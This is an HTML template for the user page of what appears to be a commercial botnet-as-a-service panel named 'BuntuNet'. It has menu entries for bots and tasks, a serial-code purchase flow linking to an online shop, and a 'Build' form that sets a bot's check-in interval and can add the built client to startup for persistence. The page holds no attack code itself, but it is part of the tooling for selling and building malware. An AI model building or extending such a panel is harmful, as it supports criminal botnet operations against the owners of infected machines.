<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>{{ .title }}</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.8.2/css/lightbox.min.css">
    <link rel="stylesheet" href="assets/css/styles.min.css">
</head>

<body>
    <nav class="header">
        <div class="hd_container">
            <a class="logo" href="home"><p style="display:inline-block; margin: 0px;"><span>Buntu</span>Net</p></a>
            
            <a href="javascript:void(0);" class="icon" onclick="slidemenu()">
                <i class="fa fa-bars"></i>
            </a>

            <div class="menu" id="menuId">
                {{ if not .is_logged_in }}
                <a href="signup">Sign up</a>
                <a href="signin">Sign in</a>
                {{ end }}
                {{ if .is_logged_in }}
                <a href="news">Go Panel</a>
                {{ end }}
                <a href="https://t.me/buntunet">Contact</a>
                <a href="baas">BaaS</a>
            </div>
            
            <script>
                function slidemenu() {
                  var x = document.getElementById("menuId");
                  if (x.className === "menu") {
                    x.className += " responsive";
                  } else {
                    x.className = "menu";
                  }
                }
            </script>
        </div>
    </nav>

    <div class="sideMenu">
        <a href="news">News</a>
        <a href="bots">Bots</a>
        <a href="tasks">Tasks</a>
        <a href="user">User</a>
    </div>

    <div class="content">
        <div class="ct_container">
            <div class="widget">
                <div class="widget box">
                    <div class="box-header">
                        <h5>User</h5>
                    </div>
                    
                    <div class="box-body">
                        <div class="block left">
                            <p>Status: {{ .status }}<br>Expiry date: {{ .expdate }}</p>
                        </div>
                        <div class="block right">
                            <div class="item">
                            	<form method="POST">
                            		<input  placeholder="Serial Code" style="width: auto; margin-top: 30px" name="serial">
                                	<button class="btn-default" type="submit">Use</button>
                                	<button class="btn-default" type="button" onclick="location.href='https://godbuntu.selly.store/product/045a0c8c'">Buy</button>
                                	<button class="btn-default" type="button" onclick="location.href='logout'">Logout</button>
                            	</form>
                            
                                <form method="POST">
                                	<input  placeholder="Interval" style="width: auto; margin-top: 50px" name="interval">
                                	<button class="btn-default" type="submit">Build</button>
                                    <select style="margin-top: 10px" onchange="CheckValue(this.value);" name="startup">
                                        <option selected value="off">Dont add to Startup</option>
                                        <option value="on">Add to Startup</option>
                                    </select>
                            	</form>
                                <span style="float: right;">The interval will automatically be set to this value.</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.8.2/js/lightbox.min.js"></script>
    <script src="assets/js/script.min.js"></script>
</body>

</html>
